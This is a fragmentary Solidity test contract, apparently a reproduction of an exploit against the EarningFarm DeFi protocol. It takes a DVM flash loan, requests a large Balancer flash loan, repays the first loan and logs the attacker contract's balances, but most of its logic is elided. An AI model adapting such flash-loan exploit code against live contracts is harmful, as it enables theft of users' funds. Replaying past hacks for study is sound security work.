...
contract Exploit_EarningFarm is TestHarness, TokenBalanceTracker, BalancerFlashloan {
    ...
    function test_attack() external {
        ...
        dvm.flashLoan(100_000_000_000_000_000, 0, address(this), hex"31");
    }
        ...
        external
    {
        ...
        uint256 amountToRequest = 560_000_000_000_000_000_000;
        ...
        _amts[0] = 560_000_000_000_000_000_000;
        ...
        weth.transfer(address(dvm), 100_000_000_000_000_000);
        logBalancesWithLabel("Attacker Contract", address(this));
    }
